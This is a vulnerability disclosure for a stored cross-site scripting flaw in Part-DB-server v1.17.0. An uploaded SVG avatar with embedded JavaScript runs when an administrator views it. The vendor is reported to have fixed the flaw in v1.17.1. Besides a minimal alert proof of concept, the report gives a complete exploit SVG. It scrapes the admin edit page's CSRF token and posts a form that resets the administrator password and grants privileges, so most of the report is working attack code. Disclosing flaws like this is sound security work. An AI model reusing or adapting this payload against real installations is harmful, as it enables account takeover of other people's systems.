Reported to the vendor on May 11, 2025.  
Fixed on May 18, 2025.

Reporter: Eduardo Bido - eduardobido@yahoo.com.br

Affected Software: https://github.com/Part-DB/Part-DB-server  
Vulnerable Version: v1.17.0  
Fixed Version: v1.17.1.  
https://github.com/Part-DB/Part-DB-server/releases/tag/v1.17.1

### Description
A Stored Cross-Site Scripting (XSS) vulnerability in the Change Profile Picture feature was found. The application allows users to upload .svg files as avatars. If a user uploads an SVG file containing embedded JavaScript, the script is executed when the image is accessed directly, which can lead to serious issues such as Account Takeover.

Here is a minimal example of a payload that triggers an alert
```svg
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
<rect width="124" height="124" rx="24" fill="#000000"/>
   <script type="text/javascript">  
  	alert(0x539);
   </script>
</svg>
```

This vulnerability becomes more critical when exploited against administrator accounts. If an admin views the malicious image, the embedded script executes in their context. Since administrators have permission to modify user accounts, a malicious payload could, for example, automatically submit a POST request to /en/user/2/edit, changing the admin's account data and leading to a full account takeover.

#### Steps to Reproduce:
1. Log in with a user account that has permission to edit their profile picture.
2. Upload an SVG file containing malicious JavaScript (a proof-of-concept txt file is attached, change to svg when uploading).
3. Have an administrator view the image (via direct link or the Users tab).
4. The script will execute in the admin's context, potentially altering their account data.

#### Notes:
1. The attack assumes the admin has the default ID 2, as typically seen after a fresh installation.
2. The avatar is accessible through a URL such as:   http://<host>:<port>/media/user/<id>/<svg-file>.svg

The exploit below can be used to change the administrator password.
```svg
<svg xmlns="http://www.w3.org/2000/svg" width="400" height="400" viewBox="0 0 124 124" fill="none">
<rect width="124" height="124" rx="24" fill="#000000"/>
   <script type="text/javascript">  
(async () => {
    const getTokenFromEditPage = async () => {
        const res = await fetch('http://192.168.1.136:8080/en/user/2/edit', {
            credentials: 'include' // include cookies (e.g. PHPSESSID)
        });
        const html = await res.text();
        const tokenMatch = html.match(/name="user_admin_form\[_token\]" value="([^"]+)"/);
        return tokenMatch ? tokenMatch[1] : null;
    };

    const sendPostRequest = async (csrfToken) => {
        const boundary = '----WebKitFormBoundaryp2d0pqksl37xZVTK';
        const body = `
--${boundary}
Content-Disposition: form-data; name="user_admin_form[name]"


admin
--${boundary}
Content-Disposition: form-data; name="user_admin_form[group]"


--${boundary}
Content-Disposition: form-data; name="user_admin_form[new_password][first]"

hijacked
--${boundary}
Content-Disposition: form-data; name="user_admin_form[new_password][second]"

hijacked
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][groups][edit_permissions]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][groups][show_history]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][groups][revert_element]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][groups][import]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][users][read]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][users][create]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][users][delete]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][users][edit_username]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][users][edit_infos]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][users][edit_permissions]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][users][impersonate]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][users][change_user_settings]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][users][show_history]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][users][revert_element]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][users][import]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][system][show_logs]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][system][system][delete_logs]"

indeterminate
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][blanko][tools][lastActivity]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][blanko][tools][label_scanner]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][blanko][tools][reel_calculator]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[permissions][blanko][tools][builtin_footprints_viewer]"

true
--${boundary}
Content-Disposition: form-data; name="user_admin_form[master_picture_attachment]"


--${boundary}
Content-Disposition: form-data; name="user_admin_form[log_comment]"


--${boundary}
Content-Disposition: form-data; name="user_admin_form[_token]"

${csrfToken}
--${boundary}
Content-Disposition: form-data; name="user_admin_form[save]"

--${boundary}--`;

        const res = await fetch('http://192.168.1.136:8080/en/user/2/edit', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': `multipart/form-data; boundary=${boundary}`,
                'Origin': 'http://192.168.1.136:8080',
                'Referer': 'http://192.168.1.136:8080/en/user/2/edit',
                'x-turbo-request-id': 'bdd66b64-72b5-47bd-bc31-2b42ed890c06',
                'User-Agent': navigator.userAgent,
                'Accept': 'text/vnd.turbo-stream.html, text/html, application/xhtml+xml'
            },
            body: body.trim()
        });

        const text = await res.text();
        console.log("Response:", text);
    };

    const token = await getTokenFromEditPage();
    if (token) {
        await sendPostRequest(token);
    } else {
        console.error("Token not found.");
    }
})();
   </script>
</svg>
```
